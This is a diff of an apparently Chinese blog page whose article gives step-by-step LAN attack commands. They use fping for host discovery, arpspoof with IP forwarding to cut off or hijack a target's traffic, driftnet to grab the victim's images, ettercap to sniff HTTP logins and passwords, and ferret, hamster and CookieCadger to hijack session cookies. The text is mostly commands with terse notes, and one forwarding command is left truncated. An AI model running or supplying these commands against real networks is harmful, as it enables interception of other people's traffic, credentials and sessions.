@@ -558,14 +558,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-06-12
+                    2021-08-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    543
+                    511
                 </div>
                 
 
@@ -588,20 +588,20 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>1.查看局域网中的主机</p>
-<p>fping –asg 192.168.1.0/24</p>
-<p>2.断网</p>
-<p>arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
-<p>(arpspoof  -i 网卡 -t 目标IP 网关)</p>
-<p>3.流量劫持</p>
-<p>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</p>
-<p>（echo空格1空格&gt;）</p>
-<p>arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
-<p>4.图片嗅探</p>
-<p>（1）方法1(实验不成功)</p>
-<p>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</p>
-<p>arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
-<p>driftnet -i wlan0</p>
-<p>（原因分析：可能丢包原因吧）</p>
+<pre class="line-numbers language-bash"><code class="language-bash">fping –asg 192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看网关</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">netstat</span> -nr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>图片嗅探</li>
+</ul>
+<p>使用命令进行流量转发：<br>要使用ip重定向才能进行arp欺骗</p>
+<pre><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></pre>
+<p>3.进行arp攻击：</p>
+<pre><code>arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
+arpspoof -i wlan0 -t 目标ip 网关 </code></pre>
+<p>4.进行driftnet进行图片的获取：</p>
+<pre><code>driftnet -i wlan0</code></pre>
+<p>目标进行网页的刷新即可获取图片。</p>
 <p>（2）方法2（成功）</p>
 <p>sudo ettercap -i wlan0  -T -M arp:remote /192.168.1.253//192.168.1.100/ </p>
 <p>driftnet -i wlan0</p>
@@ -612,7 +612,7 @@
 <p>sudo apt-get install driftnet</p>
 <p> ）</p>
 <p>5.http登录账号密码嗅探</p>
-<p>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</p>
+<p>echo 1 &gt;    </p>
 <p>arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
 <p>ettercap -Tq -i wlan0 </p>
 <p>（信息太庞杂,可以使用 ettercap -Tq -i wlan0 &gt;test方便查找）</p>
@@ -648,9 +648,6 @@
 <p>$arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
 <p>$ferret -i wlan0</p>
 <p>$hamster</p>
-<p>（3）方法3</p>
-<p>$echo 1 &gt;/proc/sys/net/ipv4/ip_forward</p>
-<p>$arpspoof -i wlan0 -t 192.168.100 192.168.1.1</p>
 <p>CookieCadger-1.08.jar</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1501,7 +1498,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">80.2k</span>&nbsp;字
+                class="white-color">80.6k</span>&nbsp;字
             
             
             
